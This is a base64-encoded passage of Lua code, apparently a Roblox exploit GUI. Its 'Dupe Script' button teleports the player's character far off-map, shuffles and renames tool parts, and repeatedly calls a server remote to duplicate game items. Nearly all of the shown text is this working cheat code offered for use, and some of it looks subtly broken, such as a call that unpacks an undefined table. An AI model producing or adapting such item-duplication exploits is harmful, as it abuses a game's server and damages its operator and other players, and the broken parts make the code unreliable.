CiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg4ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEzICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTQgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE2ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE5ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjAgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjMgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI1ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI4ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjgsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjcsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjUsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjQsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjMsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjIsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjEsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjEsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyLCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMywgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjQsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI1LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjcsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI4LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gTW92ZSB0aGUgdG9vbCB0byB0aGUgcGxheWVyIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFNldHRpbmcgdGhlIGdyaXAgcG9zaXRpb24gaW5kZXgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl90anEzdnEgPSBtYXRoLm1pbihpLCAjR3JpcFBvc1RhYmxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX25jNzFwcyA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBTZXQgdGhlIGdyaXAgcG9zaXRpb24gKEdyaXBQb3MpIGlmIHRoZSB0b29sIGlzIGluIHRoZSBwbGF5ZXIncyBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2w6SXNEZXNjZW5kYW50T2YoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2wuR3JpcFBvcyA9IGdyaXBQb3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YXJuKCJUb29sIiwgdG9vbC5OYW1lLCAiaXMgbm90IGluIGNoYXJhY3RlciIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEJ1dHRvbiBmb3IgR2lhbnQgSm91c3QgUmVkIENyb3NzClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkdpYW50IEpvdXN0IFJlZCBDcm9zcyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICB0b29sc2VsY3RlZCA9ICJKb3VzdFJlZCIKICAgICAgICBkdXBlYW1vdCA9IDE3NSAtLVB1dCBhbW91dGggdG8gZHVwZQogICAgICAgIHBpY2t0b29scmVtb3RlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKQogICAgICAgIGNsZWFydG9vbHJlbW90ZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUNsZWExclRvb2wxcyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZHVwaW5nID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9sZGNmID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQpnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIix7VGl0bGU9IkR1cGUgU2NyaXB0IixUZXh0PSJQbGVhc2UgZG8gbm90IGVxdWlwIGFueSB0b29scyBvciB1bmVxdWlwIHRvb2xzIG9yIGNsaWNrIHRvb2xzIG9uIGludmVudG9yeS4gSXQgd2lsbCBicmVhayB0aGUgc2NyaXB0LiIsIEJ1dHRvbjEgPSAiSSB1bmRlcnN0YW5kIiAsRHVyYXRpb249NX0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGFpZGosYWZoIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYWZoLk5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBhZmg6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFmaC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYWllZmhpZXdod2YsZHZqYnZqIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkdmpidmo6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkdmpidmouTmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZHZqYnZqOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0dGp0anV0anV0amp0aixkZHZkdmRzdmRmYnJueXR5dG12ZHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkZHZkdmRzdmRmYnJueXR5dG12ZHY6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkZHZkdmRzdmRmYnJueXR5dG12ZHYubmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2OkRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaW5kaW4sdG9vbGxlbCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsZWw6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGVsLk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuMiA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYmFzYyxhaWpmdyBpbiBwYWlycyh0b29sbGVsOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBhaWpmdy5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9ICJI4iClYeIgpW7iIKVk4iClbOIgpWUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsZWwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvbGxsbGFoaGhoID0gdG9vbGxlbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHRvb2xsbGxmb3VuMiA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGZpaWZpLHRvb2xsbGwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsbGw6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsLk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBuYW5hLGpqc2pzaiBpbiBwYWlycyh0b29sbGxsOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBqanNqc2ouTmFtZSA9PSAiSGFuZGxlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgampzanNqLk5hbWUgPSAiSOIgpWHiIKVu4iClZOIgpWziIKVlIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsZmZlbCA9IHRvb2xsbGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsbGxmb3VuID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbCB0aGVuICB0b29sbGxsZm91biA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sbGxmZmVsKSA9PSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbGxsbGZvdW4yID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsIHRoZW4gdG9vbGxsbGZvdW4yID0gZmFsc2UgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIG09MSwgZHVwZWFtb3QgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBtIDw9IGR1cGVhbW90IHRoZW4KICAgICAgICAgICAgICAgIGVsc2VpZiBtID09IGR1cGVhbW90IG9yIG0gPj0gZHVwZWFtb3QgLSAxIHRoZW4KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyXzY1dnFsbCA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsyXSA9IHRvb2xzZWxjdGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBpY2t0b29scmVtb3RlOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2xzZWxjdGVkXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikuTmFtZSA9ICJI4iClYeIgpW7iIKVk4iClbOIgpWUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkgdW50aWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sc2VsY3RlZCkgPT0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSA9PSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB6LHggaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB4Lk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sYW1vdXRoID0gegogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC